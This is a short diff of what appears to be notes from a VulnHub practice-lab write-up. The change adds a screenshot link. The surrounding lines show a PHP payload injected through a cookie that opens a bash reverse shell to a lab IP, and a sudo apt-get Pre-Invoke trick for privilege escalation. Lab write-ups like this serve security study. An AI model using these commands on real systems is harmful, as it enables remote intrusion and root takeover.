@@ -1,6 +1,6 @@
 Getting reverse shell with cookie exploitation : 
 Php reverse shell in cookie : <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.101/1234 0>&1'");
 
-
+![alt text](https://github.com/setrus/VulnHub/blob/master/Screenshot%20from%202019-10-02%2011-37-40.png)
 Privilege escalation with apt-get
 sudo apt-get update -o APT::Update::Pre-Invoke::= "/bin/bash -i"
